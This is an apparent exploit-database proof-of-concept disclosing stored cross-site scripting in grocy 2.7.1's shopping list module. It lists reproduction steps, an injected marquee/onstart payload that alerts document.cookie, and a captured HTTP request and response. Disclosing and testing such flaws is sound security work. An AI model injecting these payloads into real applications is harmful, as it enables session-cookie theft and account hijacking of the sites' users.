@@ -1,0 +1,50 @@
+# Exploit Title: grocy 2.7.1 - Persistent Cross-Site Scripting
+# Date: 2020-09-06
+# Exploit Author: Mufaddal Masalawala
+# Vendor Homepage: https://berrnd.de/
+# Software Link: https://github.com/grocy/grocy
+# Version: 2.7.1
+# Tested on: Kali Linux 2020.3
+
+# Proof Of Concept:
+
+grocy household management solution v2.7.1, allows stored XSS and HTML
+Injection, via Create Shopping List module, that is rendered upon
+deletiing that Shopping List.
+To exploit this vulnerability:
+1. Login to the application
+2. Go to 'Shooping List' module
+3. Click on 'New Shopping List' module
+4. Enter the payload: <marquee onstart=alert(document.cookie)> in 'Name'
+input field.
+5. Click Save
+6. Click 'Delete Shopping List'
+
+*#REQUEST -->*
+POST /api/objects/shopping_lists HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
+Firefox/68.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/shoppinglist/new
+Content-type: application/json
+Content-Length: 38
+Connection: close
+Cookie: grocy_session=GhIjKZyST7Qkx18Q97u9MaPM1LsMtBmcJ6I59gxTO3Ks4WJXUd
+{"name":"<marquee onstart=alert(1)> "}
+*#RESPONSE -->*
+HTTP/1.1 200 OK
+Server: nginx/1.18.0
+Date: Sun, 06 Sep 2020 12:53:13 GMT
+Content-Type: application/json
+Connection: close
+X-Powered-By: PHP/7.3.21
+Content-Length: 26
+
+{"created_object_id":"21"}
+
+
+Regards,
+Mufaddal M
